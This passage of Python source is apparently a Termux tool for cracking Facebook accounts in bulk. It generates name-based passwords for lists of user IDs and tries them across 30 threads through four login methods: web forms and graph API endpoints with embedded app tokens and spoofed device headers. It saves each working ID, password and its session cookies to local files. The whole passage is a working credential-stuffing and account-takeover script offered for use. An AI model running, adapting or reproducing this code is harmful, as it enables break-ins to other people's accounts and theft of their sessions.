            self.plist.append("@First@")
            self.plist.append("@first@123")
        else:
            print(linex())
            limit = int(input(f"{X} LIMITATION : "))
            print(linex())
            for a in range(limit):
                self.plist.append(input(f"{X} PASS NO.{a+1} :{G} "))
        print(linex())
        print(f"{style('1')} METHOD --> 1")
        print(f"{style('2')} METHOD --> 2")
        print(f"{style('3')} METHOD --> 3")
        print(f"{style('4')} METHOD --> 4")
        print(linex())
        mt = input(f"{X} SELECT  : ")
        with tred(max_workers=30) as Submit_Ids:
            print(banner())
            try:___iamchecking___()
            except (Exception,KeyboardInterrupt):sys.exit(linex())
            tl = str(len(file))
            print(f"{X} TOTAL ID   : {G}{tl}")
            print(f"{X} METHOD NO  : {S}M-{mt}")
            print(f"{X} IF NO RESULT [ON/OFF] AIRPLANE MODE")
            print(linex())
            print(f"\t\t{G}{day}{I}-{G}{month}{I}-{G}{year}")
            print(linex())
            for user in file:
                ids,names = user.split("|")
                passlist = self.plist
                if mt == "1":Submit_Ids.submit(self.mA,ids,names,passlist)
                elif mt == "2":Submit_Ids.submit(self.mB,ids,names,passlist)
                elif mt == "3":Submit_Ids.submit(self.mC,ids,names,passlist)
                elif mt == "4":Submit_Ids.submit(self.mD,ids,names,passlist)
                else:Submit_Ids.submit(self.mA,ids,names,passlist)
        print(linex())
        print(f"{X} THANKS FOR USING MY TOOL")
        print(f"{X} TOTAL OK   : {G}{str(len(self.oks))}")
        print(f"{X} TOTAL CP   : {R}{str(len(self.cps))}")
        print(linex())
        sys.exit()

    # Normal Method Number 1
    def mA(self,ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r{X}-{N}[{G}M1{N}]{W}-{N}[{Y}{self.loop}{N}]{W}-{N}[{W}OK:{G}{len(self.oks)}{N}]{W}-{N}[{W}CP:{R}{len(self.cps)}{N}]\r")
        sys.stdout.flush()
        try:
            first = names.split(" ")[0]
            try:last = names.split(" ")[1]
            except:last = first
            for pw in passlist:
                pas = pw.replace("first",first.lower()).replace("last",last.lower()).replace("First",first).replace("Last",last)
                link = self.ses.get("https://m.facebook.com").text
                data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "display": "","isprivate": "","return_session": "","skip_api_login": "","signed_next": "","trynum": "1","timezone": "420","lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ%3D%3D","lgnrnd": "033753_ik6I","lgnjs": "1714300673","email": ids,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(link)).group(1),pas),}
                head = {'User-Agent':ugen1(),'accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://bn-in.facebook.com','priority': 'u=0, i','referer': 'https://bn-in.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzE0MzAwNjQwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D','sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}
                url = 'https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
                post = self.ses.post(url,data=data,headers=head)
                q = post.cookies.get_dict().keys()
                if "c_user" in q:
                    coki=";".join([key+"="+value for key,value in q.cookies.get_dict().items()])
                    if ids in str(self.oks) or ids in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {ids} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-FILE-M1-OK.txt","a") as saves:
                            saves.write(ids+"|"+pas+"|"+coki+"\n")
                            self.oks.append(ids)
                        break
                elif "checkpoint" in q:
                    with open("/sdcard/MR-AWM/AWM-FILE-CP.txt","a") as saves:
                        saves.write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception:
            pass
        except KeyboardInterrupt:
            pass
    # Normal Method Number 2
    def mB(self,ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r{X}-{N}[{G}M2{N}]{W}-{N}[{Y}{self.loop}{N}]{W}-{N}[{W}OK:{G}{len(self.oks)}{N}]{W}-{N}[{W}CP:{R}{len(self.cps)}{N}]\r")
        sys.stdout.flush()
        try:
            first = names.split(" ")[0]
            try:last = names.split(" ")[1]
            except:last = first
            for pw in passlist:
                pas = pw.replace("first",first.lower()).replace("last",last.lower()).replace("First",first).replace("Last",last)
                link = self.ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
                data = {'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': 0,'unrecognized_tries': 0,'email':ids,'pass':pas,'login':'Masuk','prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': False,'had_password_prefilled': False,'is_smart_lock': False,'bi_xrwh': 0}
                headers = {'authority': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','dpr': '1.600000023841858','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"SM-A045F"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ugen2(),'viewport-width': '980'}
                post = self.ses.post('https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers,allow_redirects=False)
                q = post.cookies.get_dict().keys()
                if "c_user" in q:
                    coki=";".join([key+"="+value for key,value in q.cookies.get_dict().items()])
                    if ids in str(self.oks) or ids in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {ids} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-FILE-M2-OK.txt","a") as saves:
                            saves.write(ids+"|"+pas+"|"+coki+"\n")
                            self.oks.append(ids)
                        break
                elif "checkpoint" in q:
                    with open("/sdcard/MR-AWM/AWM-FILE-CP.txt","a") as saves:
                        saves.write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception:
            pass
        except KeyboardInterrupt:
            pass
    # Api Method Number 1
    def mC(self,ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r{X}-{N}[{G}M3{N}]{W}-{N}[{Y}{self.loop}{N}]{W}-{N}[{W}OK:{G}{len(self.oks)}{N}]{W}-{N}[{W}CP:{R}{len(self.cps)}{N}]\r")
        sys.stdout.flush()
        try:
            first = names.split(" ")[0]
            try:last = names.split(" ")[1]
            except:last = first
            for pw in passlist:
                from be_secure import http
                pas = pw.replace("first",first.lower()).replace("last",last.lower()).replace("First",first).replace("Last",last)
                data = {'adid':str(uuid.uuid4()),'format':'json','api_key':str(uuid.uuid4()),'community_id':'','device_id':str(uuid.uuid4()),'family_device_id':str(uuid.uuid4()),'currently_logged_in_userid':'0','try_num':'1','email':ids,'password':pas,'generate_analytics_claim':'1','cpl':'true','generate_session_cookies':'1','credentials_type':'password','error_detail_type':'button_with_disabled','source':'login','locale':'en_US','client_country_code':'US','advertising_id':str(uuid.uuid4()),'meta_inf_fbmeta':'NO_FILE','access_token':'256002347743983|374e60f8b9bb6b8cbb30f78030438895'}
                head = {'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895','X-FB-Connection-Quality':'EXCELLENT','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-net-hni':str(random.randint(2e4,4e4)),'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA','x-fb-friendly_name':'authenticate','content-encoding':'application/x-www-form-urlencoded','x-tigon-is_retry':'true','x-fb-http-engine':'Liger','x-requested-with':'com.facebook.katana','connection':'close','user-agent':ugen3()}
                url = "https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
                post = http.post(url,data=data,headers=head)
                hadi = json.loads(post)
                if "access_token" in hadi:
                    tani = ";".join(i["name"]+"="+i["value"] for i in hadi["session_cookies"])
                    sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={sbb};{tani}"
                    if ids in str(self.oks) or ids in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {ids} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-FILE-M3-OK.txt","a") as saves:
                            saves.write(ids+"|"+pas+"|"+coki+"\n")
                            self.oks.append(ids)
                        break
                elif "Please Confirm Email" in hadi:
                    tani = ";".join(i["name"]+"="+i["value"] for i in hadi["session_cookies"])
                    sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={sbb};{tani}"
                    if ids in str(self.oks) or ids in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {ids} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-FILE-M3-OK.txt","a") as saves:
                            saves.write(ids+"|"+pas+"|"+coki+"\n")
                            self.oks.append(ids)
                        break
                else:continue
            self.loop += 1
        except Exception as e:pass
    # Api Method Number 2
    def mD(self,ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r{X}-{N}[{G}M3{N}]{W}-{N}[{Y}{self.loop}{N}]{W}-{N}[{W}OK:{G}{len(self.oks)}{N}]{W}-{N}[{W}CP:{R}{len(self.cps)}{N}]\r")
        sys.stdout.flush()
        try:
            first = names.split(" ")[0]
            try:last = names.split(" ")[1]
            except:last = first
            for pw in passlist:
                from be_secure import http
                pas = pw.replace("first",first.lower()).replace("last",last.lower()).replace("First",first).replace("Last",last)
                data={"email": ids,"password": pas,"method": "post","pretty": "false","format": "json","server_timestamps": "true","locale": "en_US","purpose": "fetch","fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event","fb_api_caller_class": "graphservice","client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),"lois_settings": "lois_token","lara_override": "server_params","is_from_logged_out": "0","layered_homepage_experiment_group": "null","device_id": str(uuid.uuid4()),"waterfall_id": str(uuid.uuid4()),"INTERNAL__latency_qpl_instance_id": "71821365400215","is_platform_login": "0","header_transparency_event_location": "login","INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),"family_device_id": str(uuid.uuid4()),"offline_experiment_group": "caa_iteration_v6_perf_fb_2","INTERNAL_INFRA_THEME": "harm_f","headers_flow_id": str(uuid.uuid4()),"transparency_event_type": "affirmative_action","header_transparency_event_name": "login_button_clicked","is_from_logged_in_switcher": "0","bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec","app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event","scale": "2","styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1","using_white_navbar": "True","pixel_ratio": "2","is_push_on": "True","bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec","fb_api_analytics_tags": '["GraphServices"]',"client_trace_id": str(uuid.uuid4()),"generate_session_cookies": "1","generate_analytics_claim": "1","error_detail_type": "button_with_disabled"}
                head = {"x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}","content-type": "application/x-www-form-urlencoded","x-fb-connection-type": "WIFI","x-fb-background-state": "1","x-graphql-request-purpose": "fetch","user-agent": ugen4(),"authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event","x-graphql-client-library": "graphservice","x-fb-privacy-context": "3643298472347298","x-fb-device-group": "3273","x-tigon-is-retry": "False","priority": "u=3,i","accept-encoding": "gzip, deflate","x-fb-http-engine": "Liger","x-fb-client-ip": "True","x-fb-server-cluster": "True"}
                url = "https://graph.facebook.com/auth/login"
                post = http.post(url,data=data,headers=head)
                hadi = json.loads(post)
                if "access_token" in hadi:
                    tani = ";".join(i["name"]+"="+i["value"] for i in hadi["session_cookies"])
                    sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={sbb};{tani}"
                    if ids in str(self.oks) or ids in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {ids} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-FILE-M4-OK.txt","a") as saves:
                            saves.write(ids+"|"+pas+"|"+coki+"\n")
                            self.oks.append(ids)
                        break
                elif "Please Confirm Email" in hadi:
                    tani = ";".join(i["name"]+"="+i["value"] for i in hadi["session_cookies"])
                    sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={sbb};{tani}"
                    if ids in str(self.oks) or ids in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {ids} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-FILE-M4-OK.txt","a") as saves:
                            saves.write(ids+"|"+pas+"|"+coki+"\n")
                            self.oks.append(ids)
                        break
                else:continue
            self.loop += 1
        except Exception as e:pass

def __main__sys__start():
    system("termux-setup-storage")
    system("mkdir /sdcard/MR-AWM")
    try:Subscription().checking()
    except:pass

if __name__ == "__main__":
    __main__sys__start()
